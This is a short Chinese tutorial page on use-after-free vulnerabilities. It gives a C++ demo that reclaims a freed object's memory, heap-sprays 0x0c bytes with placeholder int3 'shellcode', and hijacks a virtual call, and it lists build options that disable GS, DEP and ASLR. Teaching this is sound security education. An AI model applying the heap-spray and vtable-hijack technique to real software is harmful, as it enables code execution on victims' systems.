Use After Free
========================================

简介
----------------------------------------
当申请的一个堆块在释放后，指向该堆块的指针没有清空（置NULL），就形成了一个悬挂指针（dangling pointer），而后再申请出堆块时会将刚刚释放出的堆块申请出来，并复写其内容，而悬挂指针此时仍然可以使用，使得出现了不可控的情况。攻击者一般利用该漏洞进行函数指针的控制，从而劫持程序执行流。

示例代码
-----------------------------------------

::

	#include "stdafx.h"
	#include<string>
	#include<stdio.h>

	class attack
	{
	public:
		unsigned int num;
		char buffer[8];
	public:
		attack(unsigned int n) { num = n; };
		virtual ~attack() {};
	public:
		virtual void printnum()
		{
			printf("num=%d\n", num);
		}
	};

	int main()
	{
		_asm int 3;
		
		attack *p1;
		char *p2;

		p1 = new attack(1);
		printf("p1：0x%p,size=%d\n", p1,sizeof(attack));
		delete p1;

		// 分配 p2 去“占坑”p1 的内存位置
		p2 = (char*)malloc(sizeof(attack));
		printf("p2：0x%p,size=%d\n", p2,sizeof(attack));
		memset(p2, 0x0c, 4);

		char *shellcode=new char[200 * 1024 * 1024];//堆喷
		memset(shellcode, 0x0c, 200 * 1024 * 1024);
		memset(shellcode + 200 * 1024 * 1024 - 0x10, 0xcc, 0x10);//shellcode

		// 重引用已释放的buf1指针，但却导致buf2值被篡改
		printf("==== Use After Free ===\n");
		p1->printnum();
		free(p2);
		delete[]shellcode;
		return 0;
	}

编译环境：
 | IDE：Visual Studio 2015，release
 | 编译选项：
 | 字符集：使用多字节字符集
 | c/c++->优化->优化：已禁用
 | c/c++->优化->启用内部函数：否
 | c/c++->优化->全程序优化：否
 | c/c++->预处理器->预处理定义：_CRT_SECURE_NO_WARNINGS（或禁用SDL）
 | c/c++->代码生成->安全检查：禁用安全检查（/GS-）
 | 链接器->高级->数据执行保护(DEP)-否
 | 链接器->高级->随机基址-否
 | 附件：`HeapUAF.zip <..//_static//HeapUAF.zip>`_